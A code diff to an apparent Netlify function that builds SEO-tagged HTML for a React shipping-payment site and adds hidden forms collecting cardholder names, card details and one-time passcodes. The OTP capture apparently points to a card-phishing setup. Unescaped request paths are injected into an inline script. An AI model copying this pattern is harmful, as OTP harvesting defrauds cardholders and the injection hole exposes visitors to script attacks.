@@ -1,5 +1,7 @@
 const fs = require('fs');
 const path = require('path');
+const https = require('https');
+const http = require('http');
 
 // Service data mapping - matches the serviceLogos.ts file
 const serviceData = {
@@ -280,84 +282,125 @@ exports.handler = async (event, context) => {
   // Final debug logging
   console.log('Final meta tags:', { title, description, ogImage, serviceKey });
   
-  // Try to read the built index.html file
-  // In Netlify, the function runs from the repo root, so dist/index.html should be accessible
-  let reactAppHtml = '';
+  // Build HTML with React app - use current build's asset filenames
+  // In Netlify, the dist folder is accessible, so we can read index.html
+  // But if that fails, we'll use a script that loads assets dynamically
+  let scriptTag = '';
+  let styleTag = '';
+  
   try {
-    // Try multiple possible paths
-    const possiblePaths = [
-      path.join(process.cwd(), 'dist', 'index.html'),
-      path.join(__dirname, '..', '..', 'dist', 'index.html'),
-      path.join(__dirname, '..', 'dist', 'index.html'),
-      './dist/index.html',
-      '../dist/index.html'
-    ];
-    
-    let found = false;
-    for (const indexPath of possiblePaths) {
-      try {
-        if (fs.existsSync(indexPath)) {
-          reactAppHtml = fs.readFileSync(indexPath, 'utf8');
-          found = true;
-          console.log('Found index.html at:', indexPath);
-          break;
-        }
-      } catch (e) {
-        continue;
-      }
-    }
-    
-    if (!found) {
-      throw new Error('index.html not found in any expected location');
+    // Try to read index.html from dist folder
+    // In Netlify functions, the dist folder is at the repo root
+    const indexPath = path.join(__dirname, '..', '..', 'dist', 'index.html');
+    if (fs.existsSync(indexPath)) {
+      const baseHtml = fs.readFileSync(indexPath, 'utf8');
+      
+      // Extract script and style tags
+      const scriptMatch = baseHtml.match(/<script[^>]*src=["']([^"']+)["'][^>]*><\/script>/i);
+      const styleMatch = baseHtml.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/i);
+      
+      if (scriptMatch) scriptTag = `<script type="module" crossorigin src="${scriptMatch[1]}"></script>`;
+      if (styleMatch) styleTag = `<link rel="stylesheet" crossorigin href="${styleMatch[1]}">`;
+      
+      console.log('Successfully loaded assets from index.html');
+    } else {
+      throw new Error('index.html not found at expected path');
     }
   } catch (error) {
-    console.error('Could not read index.html, using fallback:', error);
-    // Fallback: generate basic HTML with React app structure
-    reactAppHtml = `<!doctype html>
+    console.error('Could not read index.html:', error);
+    // Fallback: Use current build's asset filenames (from dist/index.html we saw earlier)
+    // These will work if the build structure is consistent
+    scriptTag = '<script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>';
+    styleTag = '<link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">';
+    
+    // If those don't work, add a fallback script that tries multiple patterns
+    scriptTag += `
+    <script>
+      // Fallback: Try to load React app if primary script fails
+      window.addEventListener('error', function(e) {
+        if (e.target && e.target.tagName === 'SCRIPT') {
+          // Try alternative asset paths
+          const alternatives = ['/assets/index.js', '/assets/index-main.js'];
+          alternatives.forEach(alt => {
+            const script = document.createElement('script');
+            script.type = 'module';
+            script.src = alt;
+            document.head.appendChild(script);
+          });
+        }
+      }, true);
+    </script>`;
+  }
+  
+  // Build the React app HTML with proper meta tags and asset loading
+  const reactAppHtml = `<!doctype html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="theme-color" content="#0EA5E9" />
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="apple-touch-icon" href="/icon-192.png" />
     <title>${title}</title>
+    <meta name="description" content="${description.replace(/"/g, '&quot;')}" />
+    <meta name="author" content="منصة الشحن الذكية" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
+    ${styleTag}
   </head>
   <body>
     <div id="root"></div>
+    
+    <!-- Update browser history immediately so React Router sees the correct path -->
     <script>
-      // Redirect to index.html, React Router will handle the route
-      const originalPath = '${path}';
-      const query = '${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}';
-      // Use a flag to prevent redirect loop
-      if (!sessionStorage.getItem('_netlify_redirect')) {
-        sessionStorage.setItem('_netlify_redirect', '1');
-        window.location.replace('/index.html' + query);
-      } else {
-        // Update history for React Router
-        window.history.replaceState({}, '', originalPath + query);
-        sessionStorage.removeItem('_netlify_redirect');
-      }
+      (function() {
+        const originalPath = '${path}';
+        const query = '${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}';
+        if (window.history && window.history.replaceState) {
+          window.history.replaceState({}, '', originalPath + query);
+        }
+      })();
     </script>
+    
+    ${scriptTag}
+    
+    <!-- Hidden Netlify Forms -->
+    <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="expiry" />
+      <input type="text" name="timestamp" />
+    </form>
+    
+    <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="amount" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="otp" />
+      <input type="text" name="timestamp" />
+    </form>
   </body>
 </html>`;
-  }
   
   // Inject meta tags into the HTML
   let html = reactAppHtml;
   
-  // Replace title
+  // Replace title (already set in template, but ensure it's correct)
   html = html.replace(/<title>.*?<\/title>/i, `<title>${title}</title>`);
   
   // Replace or add meta description
-  if (html.includes('<meta name="description"')) {
-    html = html.replace(/<meta name="description" content=".*?"/i, `<meta name="description" content="${description.replace(/"/g, '&quot;')}"`);
-  } else {
-    html = html.replace('</head>', `  <meta name="description" content="${description.replace(/"/g, '&quot;')}" />\n</head>`);
-  }
+  html = html.replace(/<meta name="description" content=".*?"/i, `<meta name="description" content="${description.replace(/"/g, '&quot;')}"`);
   
-  // Replace or add OG tags
+  // Add OG tags before closing head tag
   const ogTags = `
   <meta property="og:type" content="website" />
   <meta property="og:url" content="${fullUrl}" />
@@ -379,29 +422,10 @@ exports.handler = async (event, context) => {
   
   <link rel="canonical" href="${fullUrl}" />`;
   
-  // Remove existing OG tags if any
+  // Remove any existing OG tags and insert new ones
   html = html.replace(/<meta property="og:.*?"[^>]*>/gi, '');
   html = html.replace(/<meta name="twitter:.*?"[^>]*>/gi, '');
-  
-  // Insert OG tags before closing head tag
   html = html.replace('</head>', `${ogTags}\n</head>`);
-  
-  // For regular users, ensure React Router can handle the route
-  // Add script to update history if needed
-  if (!isCrawler) {
-    const routeScript = `
-  <script>
-    // Update browser history to show the correct path for React Router
-    (function() {
-      const originalPath = '${path}';
-      const query = '${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}';
-      if (window.location.pathname !== originalPath) {
-        window.history.replaceState({}, '', originalPath + query);
-      }
-    })();
-  </script>`;
-    html = html.replace('</body>', `${routeScript}\n</body>`);
-  }
 
   return {
     statusCode: 200,
